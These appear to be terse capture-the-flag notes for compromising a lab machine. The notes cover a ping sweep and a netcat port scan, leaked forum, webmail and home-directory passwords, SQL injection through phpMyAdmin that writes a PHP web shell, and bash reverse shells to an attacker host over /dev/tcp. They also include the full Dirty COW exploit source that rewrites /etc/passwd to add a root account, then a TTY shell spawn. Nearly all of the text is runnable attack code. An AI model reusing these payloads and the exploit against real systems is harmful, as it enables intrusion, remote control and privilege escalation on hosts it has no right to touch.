1 How to found IP address:

for ip in $(seq 1 254); do ping -c 1 10.13.100.$ip | grep "64 bytes" & done > ip

2 How to scan port :

for port in $(seq 1 9999); do
    echo "Scanning 10.13.100.250 on port $port..."
    nc -zv 10.13.100.250 $port 2>&1 | grep succeeded
done > port 

3 Port 80

4 Forum

https://10.13.100.236/forum/
https://10.13.100.236/forum/index.php?id=6

lmezard: !q\]Ej?*5K5cy*AJ

https://10.13.100.236/forum/index.php?mode=user&action=edit_profile

laurie@borntosec.net

5 Email 

https://10.13.100.236/webmail/src/login.php

https://10.13.100.236/webmail/src/webmail.php

root Fg-'kKXBj87E:aJ$

6 Databases 


Sqlinjection
https://10.13.100.236/phpmyadmin/


SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'

Listen on 
nc -lvnp 4242

bash reverse shell:

curl -k "https://10.13.100.236/forum/templates_c/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.13.100.96/4242%200%3E%261'"

------------------------------------------

SELECT '<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>' INTO OUTFILE '/var/www/forum/templates_c/alt_shell.php'

nc -lvnp 4444
curl -k "https://10.13.100.236/forum/templates_c/alt_shell.php"

-----------------------------------------

cd /home/LOOKATME

cat password

lmezard:G!@M6f4Eatau{sF"

 7 transfer files whit ftp

mget *

 -------------------------------------------------------

echo '#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n", from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  user.username = "root";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT, pid, map + o, *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth, NULL, madviseThread, NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '\''%s'\'' and the password '\''%s'\''.\n\n", user.username, plaintext_pw);
  printf("\nDON'\''T FORGET TO RESTORE! $ mv %s %s\n", backup_filename, filename);
  return 0;
}' > dirty.c
--------------------------------------------------------------------

gcc -pthread dirty.c -o dirty -lcrypt

./dirty


8 spawn a TTY shell

python -c 'import pty; pty.spawn("/bin/bash")'


su root 






















